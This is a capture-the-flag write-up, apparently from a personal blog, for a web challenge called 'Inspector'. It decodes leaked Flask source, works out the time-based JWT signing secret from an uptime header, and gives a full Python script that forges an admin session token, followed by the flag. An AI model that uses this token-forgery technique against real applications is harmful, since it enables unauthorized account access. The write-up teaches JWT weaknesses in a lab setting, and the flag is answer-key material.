---
title: Inspector
date: 2024-08-26
author: zacian
tags:
  - Web
  - JWT
draft: false
---

## Description

This Web challenge ought to challenge your mettle. It seems like a standard web application just like any other. However, what you can uncover lies in your hands. How far will you go to become the ultimate Web Conquerer. What magical secrets are you capable of uncovering? Obtain the flag and unveil to me your true and ultimate potential!!

P.S: The Docker network may experience delays of up to 2 or 3 seconds.

Access the challenge here: http:/chall.ycfteam.in:5391/

## Solution

The URL takes us to a login page. Inpecting the page gives the following base64 encoded string

```
YXBwID0gRmxhc2soX19uYW1lX18pCnN0YXJ0X3RpbWUgPSBpbnQodGltZS50aW1lKCkpCgphcHAuY29uZmlnWydTRUNSRVRfS0VZJ10gPSBmIlppLVMzQ1IzVC1LRVkte3N0YXJ0X3RpbWV9IgphcHAuY29uZmlnWydTRVNTSU9OX1NFQ1JFVF9LRVknXSA9IGFwcC5jb25maWdbJ1NFQ1JFVF9LRVknXQoKR1VFU1RfVVNFUk5BTUUgPSAiZ3Vlc3QiCkdVRVNUX1BBU1NXT1JEID0gImV6eXBhc3MxMjMiCgpkZWYgc2Vzc2lvbl9yZXF1aXJlZChmKToKICAgIEB3cmFwcyhmKQogICAgZGVmIGRlY29yYXRlZF9mdW5jdGlvbigqYXJncywgKiprd2FyZ3MpOgogICAgICAgIHRva2VuID0gcmVxdWVzdC5jb29raWVzLmdldCgnc2Vzc2lvbicpCiAgICAgICAgaWYgbm90IHRva2VuOgogICAgICAgICAgICByZXR1cm4gcmVkaXJlY3QodXJsX2ZvcignbG9naW4nKSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGRhdGEgPSBqd3QuZGVjb2RlKHRva2VuLCBhcHAuY29uZmlnWydTRVNTSU9OX1NFQ1JFVF9LRVknXSwgYWxnb3JpdGhtcz1bIkhTMjU2Il0pCiAgICAgICAgICAgIHVzZXJuYW1lID0gZGF0YS5nZXQoJ3VzZXJuYW1lJykKICAgICAgICAgICAgaWYgdXNlcm5hbWUgbm90IGluIFsnZ3Vlc3QnLCAnYWRtaW4nXToKICAgICAgICAgICAgICAgIHJhaXNlIGp3dC5JbnZhbGlkVG9rZW5FcnJvcgogICAgICAgIGV4Y2VwdCBqd3QuRXhwaXJlZFNpZ25hdHVyZUVycm9yOgogICAgICAgICAgICByZXR1cm4gcmVkaXJlY3QodXJsX2ZvcignbG9naW4nKSkKICAgICAgICBleGNlcHQgand0LkludmFsaWRUb2tlbkVycm9yOgogICAgICAgICAgICByZXR1cm4gcmVkaXJlY3QodXJsX2ZvcignbG9naW4nKSkKICAgICAgICByZXR1cm4gZigqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gZGVjb3JhdGVkX2Z1bmN0aW9u
```

After decoding the encoded base64 string using [CyberChef](https://gchq.github.io/CyberChef/) we get the following code

```py
app = Flask(__name__)
start_time = int(time.time())

app.config['SECRET_KEY'] = f"Zi-S3CR3T-KEY-{start_time}"
app.config['SESSION_SECRET_KEY'] = app.config['SECRET_KEY']

GUEST_USERNAME = "guest"
GUEST_PASSWORD = "ezypass123"

def session_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('session')
        if not token:
            return redirect(url_for('login'))
        try:
            data = jwt.decode(token, app.config['SESSION_SECRET_KEY'], algorithms=["HS256"])
            username = data.get('username')
            if username not in ['guest', 'admin']:
                raise jwt.InvalidTokenError
        except jwt.ExpiredSignatureError:
            return redirect(url_for('login'))
        except jwt.InvalidTokenError:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function
```

So we get some login creds for guest user and half secret key, where the key was initially was created when the application started

After logging in we get our JWT token with following values

Header

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload

```
{
  "username": "guest"
}
```

and we just have to find secret key to sign the token with username as `admin`.

----

In the application after sucessful logon in we get redirected to `/dashboard`. Where there we get a see a line that says 

```
Welcome, Guest!

Not much to do here...You can check out my /health though :) Just to be nice and all.
```

If we visit `/health` page we see the following line 

```
Hey! Thanks for asking. I'm doing pretty good. What about you?
```

But if we enumerate the page more we get to find a header in the response 

```
X-App-Uptime : 380659 seconds
```

I don't have much idea about the header, nor did i found any online refference, so it's much be some custom header that is tracking the time for how long the application is up or ruinning, which we can use the calcualte the initial time when the application actaully stated. 

What we can do is subtract the current int(time.time()) with X-App-Uptime value. I did this using a quick and dirty python script made with help of chatGPT


```py
import jwt
import time
import re
import requests

url = 'http://chall.ycfteam.in:5391/'
credentials = {
    'username': 'guest',
    'password': 'ezypass123'
}

half_secret_key = 'Zi-S3CR3T-KEY-'
flag_pattern = r'CyGenixCTF\{[^}]+\}'

# Function to login and get JWT
def get_jwt_token(login_url, creds):
    response = requests.post(login_url, data=creds, allow_redirects=False)
    if response.status_code == 302:
        location = response.headers.get('Location')
        if location == "/dashboard":
            print("\n[*] Login Successful")
        else:
            print("\n[!] Login Failed")
            exit()
    
    cookies = response.cookies
    cookies_dict = requests.utils.dict_from_cookiejar(cookies)
    return cookies_dict.get('session')

# Function to decode and modify the JWT
def modify_jwt(token):
    # Decode the JWT without verifying the signature
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    print(f"\n[*] Decoded Original JWT Token\n-------------------\n{decoded_token}\n-------------------")
    
    # Modify the 'username' field in jwt token to get admin access 
    decoded_token['username'] = 'admin'
    print(f"\n[*] Modified JWT Token\n-------------------\n{decoded_token}\n-------------------")   

    # Get the initial time
    dashboard_headers = requests.get(f'{url}/health')
    up_time = dashboard_headers.headers.get('X-App-Uptime', '0').split(' ')[0]

    try:
        up_time = int(up_time)
    except ValueError:
        print("\n[!] Failed to parse X-App-Uptime header")
        exit()

    current_time = int(time.time())
    secret_key = f'{half_secret_key}{current_time - up_time}'

    # Re-encode and sign the JWT with the dynamically constructed secret key
    new_token = jwt.encode(decoded_token, secret_key, algorithm='HS256')
    print(f"\n[*] Encoded Modified JWT Token")
    print(f"[*] With Secret Key : {secret_key}")
    print(f"-------------------\n{new_token}\n-------------------")

    return new_token

# Login and get the JWT token
token = get_jwt_token(f"{url}/login", credentials)
print(f"\n[*] Original JWT Token\n-------------------\n{token}\n-------------------")

# Placing the modied JWT token as session value for the new cookie
modified_token = modify_jwt(token)
cookies = {'session': modified_token}

# Make request to /dashboard with the modified token to obtain flag
is_flag_here = requests.get(f'{url}/dashboard', cookies=cookies)
matches = re.findall(flag_pattern, is_flag_here.text)
if matches:
    for match in matches:
        print(f"\n[*] Flag Found: {match}\n")
else:
    print(f"\n[!] No flag for you\n")

```

```
CyGenixCTF{N0O00_mY_He4lth_G4v3_yOu_tHe_S3cret_K3Y!!}
```